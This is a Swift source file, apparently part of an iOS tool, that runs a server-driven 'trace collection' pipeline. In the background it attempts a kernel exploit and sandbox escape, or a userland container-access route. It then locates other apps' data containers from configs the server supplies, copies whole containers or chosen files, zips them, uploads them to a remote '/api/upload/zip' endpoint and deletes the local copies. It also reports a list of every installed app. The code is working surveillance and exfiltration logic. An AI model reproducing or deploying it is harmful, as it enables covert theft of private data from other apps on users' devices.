import Foundation

/// iOS > 26.1.0 的 in-app 采集上报管线（移植自 3105 的 ProtocolCollectService）：
/// `/api/device/report` 拉配置 → MCM 租约拿容器 → 复制 payload → 打 zip →
/// `/api/upload/zip` 上传 → 删本地 zip。
///
/// 与 legacy 分支（dlopen apptrace/libapptracecore）互斥：
///   iOS <= 26.1.0 → LegacyTracePipeline
///   iOS >  26.1.0 → TraceCollector
enum TraceCollector {
    static let maximumLocalZipCount = 10

    private static let lock = NSLock()
    private static var started = false

    /// 严格大于 26.1.0（26.1.1 / 26.2 / 27.x）才走 in-app 管线
    static var shouldRunInAppPipeline: Bool {
        let (major, minor, patch) = TraceAppInfo.osVersionTuple
        if major != 26 { return major > 26 }
        if minor != 1 { return minor > 1 }
        return patch > 0
    }

    /// 进程内幂等；提权在后台完成后再跑采集
    static func startIfNeeded() {
        guard shouldRunInAppPipeline else {
            traceLog("in-app pipeline skipped — iOS \(TraceAppInfo.osVersion) is not above 26.1.0")
            return
        }

        lock.lock()
        let isFirstCall = !started
        started = true
        lock.unlock()
        guard isFirstCall else { return }

        traceLog("in-app pipeline selected for iOS \(TraceAppInfo.osVersion) (build \(TraceAppInfo.buildID))")
        traceLog("MCM bridge available=\(MCMLease.isBridgeAvailable) hostBundleIDMatches=\(MCMLease.hostBundleIDMatches)")

        // 组名必须在签发侧和查询侧一致：签名里有组、但设备上没有它的容器时，
        // containermanagerd 只回 -6，把它当"这个路径不行"就会把整条链判死。
        let entitled = UserlandAccess.entitledGroups
        let usable = UserlandAccess.usableGroups
        traceLog("userland: groups entitled=\(entitled) usable=\(usable)")
        if entitled != usable {
            traceLog("userland: WARNING entitled/usable mismatch — sig=\(entitled) usable=\(usable)；不匹配的组一律不发 token")
        }

        DispatchQueue.global(qos: .utility).async {
            let (maj, min, pat) = TraceAppInfo.osVersionTuple
            if !KernelBridge.hasSandboxAccess {
                if ExploitPolicy.supportsKernel(major: maj, minor: min, patch: pat) {
                    traceLog("in-app pipeline: elevating (kexploit + sandbox escape)…")
                    let ok = KernelBridge.run()
                    traceLog("in-app pipeline: kernel elevation \(ok ? "ok" : "failed — falling back to userland")")
                    if !ok { _ = UserlandAccess.probe(force: true) }
                } else {
                    traceLog("in-app pipeline: iOS \(TraceAppInfo.osVersion) — userland route (worse_query)…")
                    let ok = UserlandAccess.probe(force: true)
                    traceLog("in-app pipeline: userland access \(ok ? "ok" : "failed — \(UserlandAccess.lastError)")")
                }
            }

            Task {
                do {
                    let result = try await runCycle()
                    traceLog("cycle finished — zips=\(result.zipCount) uploaded=\(result.uploadedCount) bytes=\(result.byteCount)")
                    if result.uploadedCount > 0 {
                        try? await TraceAPI.reportLog(
                            text: "采集完成 — 已完成 \(result.zipCount) 个（上传 \(result.uploadedCount) 个）"
                        )
                    }
                } catch {
                    traceLog("cycle failed — \(error)")
                }
            }
        }
    }

    // MARK: - One cycle

    static func runCycle(fileManager: FileManager = .default) async throws -> TraceCycleResult {
        let configs = try await TraceAPI.pullCollectConfigs()
        traceLog("cycle: got \(configs.count) config(s)")

        guard !configs.isEmpty else {
            throw TraceError.collectionFailed("empty collect configs")
        }

        // 先把容器索引建起来（首次约 12s，之后 5 分钟 TTL 内命中）。不预热的话
        // 13 个 config 会在索引还空的时候逐个解析，一个都命中不了 —— log2_86
        // 的 1/13 就是在这个空窗里判死的。这一行也顺手把「本机到底有几个 app」
        // 写进日志，方便区分「工具没工作」和「目标没安装」。
        let warmed = ContainerStore.containerIndexSnapshot()
        traceLog("cycle: container index warmed — \(warmed.count) entries")

        // 已安装清单并行上报，不阻塞 zip 循环（3105 的经验：串行会让 App 被挂起）
        Task.detached(priority: .utility) {
            // 与 3105 完全一致的多源合并枚举
            let ids = enumerateInstalledBundleIDs()
            do {
                try await TraceAPI.reportInstalledApps(ids)
            } catch {
                traceLog("device/apps report failed — \(error)")
            }
        }

        let documents = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let stamp = timestampString()
        var zipCount = 0
        var uploadedCount = 0
        var byteCount: Int64 = 0

        for (index, config) in configs.enumerated() {
            traceLog("cycle: \(index + 1)/\(configs.count) bundle=\(config.bundleID) items=\(config.items.count)")

            guard let containerPath = resolveContainer(for: config) else {
                traceLog("cycle: skip \(config.bundleID) — container unavailable")
                continue
            }
            let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
            let sources: [(url: URL, name: String)] = config.items.compactMap { item in
                guard let url = resolvedItemURL(item, containerURL: containerURL, config: config, fileManager: fileManager) else {
                    return nil
                }
                return (url, url.lastPathComponent)
            }
            guard !sources.isEmpty else {
                traceLog("cycle: skip \(config.bundleID) — no collectable items")
                continue
            }

            let folderName = appFolderName(for: config)
            let stagingParent = documents.appendingPathComponent(".collect-\(stamp)-\(UUID().uuidString)", isDirectory: true)
            let staging = stagingParent.appendingPathComponent(folderName, isDirectory: true)
            do {
                try fileManager.createDirectory(at: staging, withIntermediateDirectories: true)
            } catch {
                traceLog("cycle: cannot create staging folder — \(error)")
                continue
            }

            var copied = 0
            let containerRoot = URL(fileURLWithPath: containerPath, isDirectory: true)
            for source in sources {
                if source.url.standardizedFileURL == containerRoot.standardizedFileURL {
                    // 整容器项：把容器里的条目平铺进 <appName>/（与 legacy zip 结构一致）
                    let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
                    traceLog("cycle: whole-container copy — \(entries.count) entries")
                    for entry in entries {
                        let child = source.url.appendingPathComponent(entry)
                        copied += copyItem(child, into: staging, fileManager: fileManager)
                    }
                    continue
                }
                copied += copyItem(source.url, into: staging, fileManager: fileManager)
            }

            guard copied > 0 else {
                try? fileManager.removeItem(at: stagingParent)
                traceLog("cycle: skip \(config.bundleID) — nothing copied")
                continue
            }

            let zipName = uniqueZipName(baseName: "collect-\(folderName)-\(stamp)", in: documents, fileManager: fileManager)
            let zipURL = documents.appendingPathComponent(zipName + ".zip")
            do {
                let written = try ZIPArchiveWriter.write(items: [staging], to: zipURL, fileManager: fileManager)
                try? fileManager.removeItem(at: stagingParent)
                zipCount += 1
                byteCount += written.sourceBytes
                traceLog("cycle: zip ok — \(zipURL.lastPathComponent) entries=\(written.entryCount) bytes=\(written.sourceBytes)")
            } catch {
                try? fileManager.removeItem(at: stagingParent)
                traceLog("cycle: zip failed for \(config.bundleID) — \(error)")
                continue
            }

            do {
                try await TraceAPI.uploadZip(fileURL: zipURL, bundleID: config.bundleID)
                uploadedCount += 1
                try? fileManager.removeItem(at: zipURL)
                traceLog("cycle: upload ok + local zip removed — \(zipURL.lastPathComponent)")
            } catch {
                traceLog("cycle: upload failed — \(zipURL.lastPathComponent): \(error)")
            }
        }

        pruneLocalZips(in: documents, fileManager: fileManager)
        let result = TraceCycleResult(zipCount: zipCount, uploadedCount: uploadedCount, byteCount: byteCount)
        traceLog("cycle: done zips=\(zipCount) uploaded=\(uploadedCount) bytes=\(byteCount)")
        return result
    }

    // MARK: - Container / item resolution

    private static func resolveContainer(for config: TraceCollectConfig) -> String? {
        // 全部是绝对路径（/var/mobile/Media/...）时不需要容器：以 "/" 为基准
        let allAbsolute = !config.items.isEmpty && config.items.allSatisfy { item in
            let p = item.path.trimmingCharacters(in: .whitespaces)
            guard !p.isEmpty, p != "/", p != ".", p != "./" else { return false }
            return p.hasPrefix("/")
        }
        if allAbsolute {
            traceLog("cycle: \(config.bundleID) items are absolute paths — base is /")
            // 27.x 没有内核访问，每个绝对路径都要单独拿 userland 扩展
            for item in config.items {
                _ = ContainerStore.retainAccess(item.path)
            }
            return "/"
        }

        // 与 3105 的 ProtocolCollectCenter.resolveContainer 完全同序：
        //   group.* -> ContainerStore.resolveGroupContainerPath
        //              失败则退回 app 容器
        //   普通    -> ContainerStore.resolveAppContainerPath
        //   accessGroup -> ContainerStore.resolveGroupContainerPath
        // ContainerStore 内部每步都会 retainAccess 保住 userland 扩展。
        if config.bundleID.hasPrefix("group.") {
            if let path = ContainerStore.resolveGroupContainerPath(identifier: config.bundleID) {
                traceLog("cycle: group container \(config.bundleID) -> \(path)")
                return path
            }
            let appBundleID = String(config.bundleID.dropFirst("group.".count))
            if let path = ContainerStore.resolveAppContainerPath(bundleID: appBundleID) {
                traceLog("cycle: group lease unavailable — using app container \(appBundleID) -> \(path)")
                return path
            }
        } else if let path = ContainerStore.resolveAppContainerPath(bundleID: config.bundleID) {
            traceLog("cycle: app container \(config.bundleID) -> \(path)")
            return path
        }

        if !config.accessGroup.isEmpty,
           let path = ContainerStore.resolveGroupContainerPath(identifier: config.accessGroup) {
            traceLog("cycle: accessGroup container \(config.accessGroup) -> \(path)")
            return path
        }
        traceLog("cycle: \(config.bundleID) — no container (LS/MI/MCM/scan all failed)")
        return nil
    }

    private static func resolvedItemURL(
        _ item: TraceCollectItem,
        containerURL: URL,
        config: TraceCollectConfig,
        fileManager: FileManager
    ) -> URL? {
        var normalized = item.path
        while normalized.contains(" /") || normalized.contains("/ ") {
            normalized = normalized
                .replacingOccurrences(of: " /", with: "/")
                .replacingOccurrences(of: "/ ", with: "/")
        }
        normalized = normalized.trimmingCharacters(in: .whitespaces)

        if normalized.isEmpty || normalized == "/" || normalized == "." || normalized == "./" {
            guard containerURL.path != "/" else { return nil }
            return fileManager.fileExists(atPath: containerURL.path) ? containerURL : nil
        }

        var candidates: [String] = []
        if normalized.hasPrefix("/") {
            candidates = [normalized]
        } else {
            candidates = [(containerURL.path as NSString).appendingPathComponent(normalized)]
            let prefix = "Library/Application Support/"
            if normalized.hasPrefix(prefix) {
                let rest = String(normalized.dropFirst(prefix.count))
                if !rest.isEmpty {
                    var layout = containerURL.path
                    for component in ["Library", "Application Support", config.bundleID] + rest.components(separatedBy: "/") {
                        layout = (layout as NSString).appendingPathComponent(component)
                    }
                    candidates.append(layout)
                }
            }
        }

        for candidate in candidates {
            let url = URL(fileURLWithPath: candidate, isDirectory: item.type == "dir")
            if fileManager.fileExists(atPath: url.path) { return url }
        }
        traceLog("cycle: skip missing \(item.path) — tried \(candidates.count) variant(s)")
        return nil
    }

    // MARK: - Copy / zip / housekeeping

    private static func copyItem(_ source: URL, into directory: URL, fileManager: FileManager) -> Int {
        let target = directory.appendingPathComponent(source.lastPathComponent)
        do {
            try fileManager.copyItem(at: source, to: target)
            return 1
        } catch {
            traceLog("cycle: copy failed \(source.lastPathComponent) — \(error.localizedDescription)")
            return copyFileByFile(source, into: directory, fileManager: fileManager, depth: 0)
        }
    }

    /// 目录复制失败时的兜底：逐文件 Data 读写，读不动的跳过
    private static func copyFileByFile(_ source: URL, into directory: URL, fileManager: FileManager, depth: Int) -> Int {
        guard depth < 16 else { return 0 }
        var isDir: ObjCBool = false
        guard fileManager.fileExists(atPath: source.path, isDirectory: &isDir) else { return 0 }
        let target = directory.appendingPathComponent(source.lastPathComponent, isDirectory: isDir.boolValue)

        if !isDir.boolValue {
            do {
                try fileManager.createDirectory(atPath: target.deletingLastPathComponent().path, withIntermediateDirectories: true)
                let data = try Data(contentsOf: source, options: [.uncached])
                try data.write(to: target, options: .atomic)
                return 1
            } catch {
                traceLog("cycle: skip file \(source.lastPathComponent) — \(error.localizedDescription)")
                return 0
            }
        }

        var count = 0
        if let entries = try? fileManager.contentsOfDirectory(atPath: source.path) {
            for entry in entries {
                count += copyFileByFile(source.appendingPathComponent(entry), into: target, fileManager: fileManager, depth: depth + 1)
            }
        }
        return count
    }

    private static func appFolderName(for config: TraceCollectConfig) -> String {
        let serverName = sanitizedFolderName(config.appName)
        if !serverName.isEmpty { return serverName }

        if config.bundleID.hasPrefix("group.") {
            let trimmed = String(config.bundleID.dropFirst("group.".count))
            let short = sanitizedFolderName(trimmed.components(separatedBy: ".").last ?? trimmed)
            if !short.isEmpty { return short.lowercased() }
        }

        var parts = config.bundleID.components(separatedBy: ".")
        if parts.count > 1 {
            if parts.last?.lowercased() == "app" {
                parts.removeLast()
                let derived = sanitizedFolderName(parts.joined().lowercased())
                if !derived.isEmpty { return derived }
            } else {
                let derived = sanitizedFolderName(parts.last?.lowercased() ?? "")
                if !derived.isEmpty { return derived }
            }
        }
        let fallback = sanitizedFolderName(config.bundleID.lowercased())
        return fallback.isEmpty ? "payload" : fallback
    }

    private static func sanitizedFolderName(_ raw: String) -> String {
        let invalid = CharacterSet(charactersIn: "\\/:*?\"<>|").union(.controlCharacters)
        var name = raw.components(separatedBy: invalid).joined(separator: " ")
        name = name.split(separator: " ").joined(separator: " ")
        name = name.trimmingCharacters(in: .whitespacesAndNewlines)
        while name.hasSuffix(".") { name.removeLast() }
        guard !name.isEmpty, name != ".", name != ".." else { return "" }
        return name.count > 64 ? String(name.prefix(64)) : name
    }

    private static func timestampString() -> String {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter.string(from: Date())
    }

    private static func uniqueZipName(baseName: String, in directory: URL, fileManager: FileManager) -> String {
        var candidate = baseName
        var suffix = 2
        while fileManager.fileExists(atPath: directory.appendingPathComponent(candidate + ".zip").path) {
            candidate = "\(baseName)-\(suffix)"
            suffix += 1
        }
        return candidate
    }

    private static func pruneLocalZips(in directory: URL, fileManager: FileManager) {
        let names = ((try? fileManager.contentsOfDirectory(atPath: directory.path)) ?? [])
            .filter { $0.hasPrefix("collect-") && $0.hasSuffix(".zip") }
            .sorted()
        let excess = names.count - maximumLocalZipCount
        guard excess > 0 else { return }
        for name in names.prefix(excess) {
            try? fileManager.removeItem(at: directory.appendingPathComponent(name))
            traceLog("cycle: pruned local zip \(name)")
        }
    }

    // MARK: - 已安装应用枚举（1:1 移植 3105 ProtocolCollectCenter.enumerateInstalledBundleIDs）

    private static func enumerateInstalledBundleIDs() -> [String] {
        let bundleMetadata = ContainerStore.applicationBundleMetadataCatalog()
        let apiApps = ContainerStore.applyingBundleMetadata(
            to: ContainerStore.installedAppsFromAPI(),
            catalog: bundleMetadata
        )
        let dynamicIdentifiers = ContainerStore.dynamicAppIdentifiers()
        let mcmApps = ContainerStore.installedAppsFromMCM(
            identifiers: dynamicIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let filesystemApps = ContainerStore.containersFromFilesystem()
        let baseIdentifiedApps = mcmApps + apiApps
        _ = ContainerDiscoveryMerger.merge(
            enumerated: filesystemApps,
            identified: baseIdentifiedApps,
            path: { $0.containerPath }
        )
        // LaunchServices csstore 里 2 万多条候选要逐个 MHA 查询（实测 30s+），
        // 3105 已关闭这个来源，只保留 MCM + 文件系统。
        let launchServicesIdentifiers: [String] = []
        let mhaIdentifiers = MHAIdentifierCatalog.identifiers(
            dynamic: dynamicIdentifiers,
            installed: apiApps.map(\.bundleID),
            research: ContainerStore.researchAppIdentifiers,
            custom: bundleMetadata.keys.sorted(),
            launchServices: launchServicesIdentifiers
        )
        let mhaApps = ContainerStore.installedAppsFromMHACandidates(
            identifiers: mhaIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let allKnownApps = mhaApps + baseIdentifiedApps
        let identifiedPaths = Set(allKnownApps.map {
            ContainerDiscoveryMerger.canonicalPath($0.containerPath)
        })
        let unmatched = filesystemApps.filter {
            !identifiedPaths.contains(
                ContainerDiscoveryMerger.canonicalPath($0.containerPath)
            )
        }
        let inferred = ContainerStore.inferUnidentifiedApps(
            in: unmatched,
            knownApps: allKnownApps,
            launchServicesIdentifiers: Set(launchServicesIdentifiers)
        )
        let finalApps = AppDataCatalogMerger.merge(
            identified: allKnownApps,
            fallback: inferred,
            identifier: { $0.bundleID },
            path: { $0.containerPath }
        )

        var seen = Set<String>()
        var result: [String] = []
        for app in finalApps {
            let bundleID = app.bundleID
            guard ContainerPresentationPolicy.shouldShow(bundleID: bundleID),
                  ContainerBundleCandidateResolver.isValidBundleIdentifier(bundleID),
                  seen.insert(bundleID).inserted else { continue }
            result.append(bundleID)
        }
        result.sort()
        traceLog("collect: enumerated \(result.count) installed bundle ids for reporting")
        return result
    }

}
